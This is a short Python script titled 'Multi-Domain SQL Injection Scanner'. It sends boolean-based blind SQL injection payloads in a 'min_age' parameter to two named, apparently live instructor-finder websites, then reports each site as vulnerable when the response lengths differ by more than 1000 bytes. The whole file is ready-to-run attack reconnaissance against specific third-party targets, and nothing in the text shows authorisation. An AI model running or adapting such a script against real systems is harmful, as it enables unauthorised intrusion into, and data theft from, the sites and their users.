import requests

DOMAINS = [
    "https://lms.rocket-soft.org/instructor-finder",
    "https://learnyway.com/instructor-finder"
]
PARAM = "min_age"

def check_domain(url):
    print(f"\n[*] Testing: {url}")
    try:
        # Test TRUE
        resp_true = requests.get(url, params={PARAM: "1 AND (1=1)"}, timeout=15)
        len_true = len(resp_true.text)
        
        # Test FALSE
        resp_false = requests.get(url, params={PARAM: "1 AND (1=2)"}, timeout=15)
        len_false = len(resp_false.text)
        
        diff = abs(len_true - len_false)
        print(f"    TRUE Length : {len_true}")
        print(f"    FALSE Length: {len_false}")
        print(f"    Difference  : {diff} bytes")
        
        if diff > 1000:
            print(f"    [+] RESULT: VULNERABLE")
            return True
        else:
            print(f"    [-] RESULT: NOT VULNERABLE (or direct results not applicable)")
            return False
    except Exception as e:
        print(f"    [!] Error: {e}")
        return False

def main():
    print("=== Multi-Domain SQL Injection Scanner ===")
    results = {}
    for domain in DOMAINS:
        results[domain] = check_domain(domain)
    
    print("\n" + "="*40)
    print("Summary:")
    for d, v in results.items():
        status = "VULNERABLE" if v else "SECURE/NOT FOUND"
        print(f"{d}: {status}")
    print("="*40)

if __name__ == "__main__":
    main()
